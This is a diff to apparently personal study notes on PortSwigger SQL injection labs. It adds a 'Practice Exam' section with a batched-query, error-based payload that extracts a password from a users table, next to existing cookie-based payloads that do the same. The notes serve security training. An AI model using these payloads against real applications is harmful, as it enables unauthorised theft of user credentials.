@@ -412,6 +412,17 @@ Cookie: TrackingId='||(CAST((SELECT username FROM users LIMIT 1) AS int))--
 Cookie: TrackingId='||(CAST((SELECT password FROM users LIMIT 1) AS int))--
 ```
 
+## Practice Exam
+
+> There's an advanced search function and ***Burp Scanner*** was able to identify it
+
+> Because the injection is at the end of the query we need to use batched queries
+
+> The SQLi is based on this [lab](#[7.%20Visible%20error-based%20SQL%20injection](https%20//portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based))
+
+```sql
+organize_by=AUTHOR; SELECT 'a'||CAST((SELECT password FROM users LIMIT 1) AS int);
+```
 ## Cheat Sheet
 
 https://portswigger.net/web-security/sql-injection/cheat-sheet
